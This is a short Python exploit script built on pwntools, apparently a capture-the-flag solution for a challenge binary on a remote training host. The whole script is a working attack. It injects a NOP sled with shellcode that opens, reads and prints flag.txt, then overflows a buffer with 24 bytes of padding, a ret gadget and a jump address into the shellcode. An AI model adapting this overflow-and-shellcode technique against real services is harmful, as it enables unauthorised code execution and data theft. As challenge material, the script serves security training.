#!/usr/bin/env python3

from pwn import *

exe = ELF("./binary1")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
    if args.GDB:
        r = gdb.debug([exe.path], '''
        c
        ''')
    else:
        r = remote("cyberchallenge-web", 9046)

    return r


def main():
    r = conn()

    addr = 0x1337000 + 100
    
    
    # Inserting shellcode
    shellcode = 'nop\n'*150
    shellcode += shellcraft.open('flag.txt', 0)
    shellcode += 'mov ebx, eax\n'
    shellcode += shellcraft.read('ebx', 'rdi', 0x100)
    shellcode += shellcraft.write(1, 'rsi', 0x100)
    #shellcode += shellcraft.exit()

    shellcode = asm(shellcode)

    r.sendline(shellcode)


    # Inserting ret
    pad = 24
    rop = ROP(exe)

    payload = b"a"*pad + p64(rop.ret.address) + p64(addr)
    r.sendline(payload)
    r.interactive()




if __name__ == "__main__":
    main()